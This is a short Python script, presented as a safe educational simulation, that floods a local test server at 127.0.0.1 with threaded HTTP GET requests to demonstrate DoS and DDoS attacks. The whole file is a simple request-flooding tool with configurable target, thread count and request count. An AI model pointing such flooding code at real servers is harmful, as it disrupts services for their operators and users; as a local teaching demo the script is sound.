# DoS and DDoS Attack Simulation
# ------------------------------
# Safe educational example (does NOT harm real servers).
# It demonstrates flooding a local test server.

import threading
import requests
import time

# Target server (local test server)
TARGET = "http://127.0.0.1:5000"  # Replace with your local test server
REQUESTS = 50   # number of requests per thread
THREADS = 5     # number of attack threads (simulate attackers)

# Function to send multiple requests (DoS / attack worker)
def attack_worker(id):
    print(f"[Thread-{id}] starting attack...")
    for i in range(REQUESTS):
        try:
            r = requests.get(TARGET)
            print(f"[Thread-{id}] Request {i+1}: {r.status_code}")
        except Exception as e:
            print(f"[Thread-{id}] Request {i+1} failed: {e}")

# Main program
if __name__ == "__main__":
    print("=== DoS & DDoS Simulation ===")
    start = time.time()

    # Create multiple threads to simulate distributed attack
    threads = []
    for i in range(THREADS):
        t = threading.Thread(target=attack_worker, args=(i+1,))
        threads.append(t)
        t.start()

    # Wait for all threads to finish
    for t in threads:
        t.join()

    end = time.time()
    print(f"\nAttack simulation finished in {end - start:.2f} seconds")
